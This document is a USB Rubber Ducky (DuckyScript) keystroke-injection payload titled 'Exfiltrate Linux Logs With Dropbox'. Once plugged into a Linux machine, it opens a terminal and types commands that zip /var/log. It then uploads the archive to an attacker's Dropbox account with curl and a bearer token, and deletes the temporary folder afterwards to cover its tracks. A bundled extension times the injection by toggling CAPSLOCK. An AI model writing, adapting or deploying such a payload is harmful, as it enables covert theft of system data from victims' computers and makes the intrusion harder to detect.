REM_BLOCK
######################################################
#                                                    #
# Title        : Exfiltrate Linux Logs With Dropbox  #
# Author       : Aleff                               #
# Version      : 1.0                                 #
# Category     : Exfiltration, Execution             #
# Target       : Linux                               #
#                                                    #
######################################################
END_REM

REM Requirements:
REM     - Internet Connection
REM     - Dropbox Account
REM     - - DROPBOX_ACCESS_TOKEN

REM Required: Set here your Dropbox access TOKEN
DEFINE #TOKEN example

REM Send to Dropbox function
DEFINE #DROPBOX_API_LINK https://content.dropboxapi.com/2/files/upload

EXTENSION DETECT_READY
    REM VERSION 1.1
    REM AUTHOR: Korben

    REM_BLOCK DOCUMENTATION
        USAGE:
            Extension runs inline (here)
            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
            boot delay

        TARGETS:
            Any system that reflects CAPSLOCK will detect minimum required delay
            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms
    END_REM

    REM CONFIGURATION:
    DEFINE #RESPONSE_DELAY 25
    DEFINE #ITERATION_LIMIT 120

    VAR $C = 0
    WHILE (($_CAPSLOCK_ON == FALSE) && ($C < #ITERATION_LIMIT))
        CAPSLOCK
        DELAY #RESPONSE_DELAY
        $C = ($C + 1)
    END_WHILE
    CAPSLOCK
END_EXTENSION

CTRL-ALT t
DELAY 2000
STRINGLN ACCESS_TOKEN="#TOKEN"

DELAY 500
STRINGLN USER_NAME=$(whoami)

REM Create random num
DELAY 500
STRINGLN RANDOM=$(shuf -i 1-999999999999 -n 1)

REM Folder path
DELAY 500
STRINGLN TMP_FOLDER_PATH=$(mktemp -d -p "/home/$USER_NAME/tmp/" prefix-XXXXXXXXXX)

REM Zip path
DELAY 500
STRINGLN ZIP_NAME="$RANDOM.zip"
DELAY 500
STRINGLN ZIP_PATH="$TMP_FOLDER_PATH/$ZIP_NAME"

REM Default log path
DELAY 500
STRINGLN LOG_PATH="/var/log/"

DELAY 500
STRINGLN zip -r "$ZIP_PATH" "$LOG_PATH"

REM Delay of zipping operation - it depends
DELAY 10000

DELAY 500
STRINGLN DROPBOX_FOLDER="/$ZIP_NAME"

DELAY 500
STRINGLN curl -X POST #DROPBOX_API_LINK --header "Authorization: Bearer $ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"$DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@$ZIP_PATH"

REM Send timing - it depends
DELAY 5000

DELAY 500
STRINGLN rm -rf "$TMP_FOLDER_PATH"
